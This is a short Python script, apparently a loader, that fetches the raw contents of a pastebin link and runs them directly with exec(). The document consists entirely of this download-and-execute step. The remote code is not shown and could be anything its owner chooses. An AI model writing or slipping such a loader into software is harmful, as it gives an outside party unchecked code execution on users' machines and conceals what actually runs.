import requests
getlink = 'https://pastebin.com/raw/Yc1rB5a9'
one = requests.get(getlink)
test = str(one.text)
exec(test)
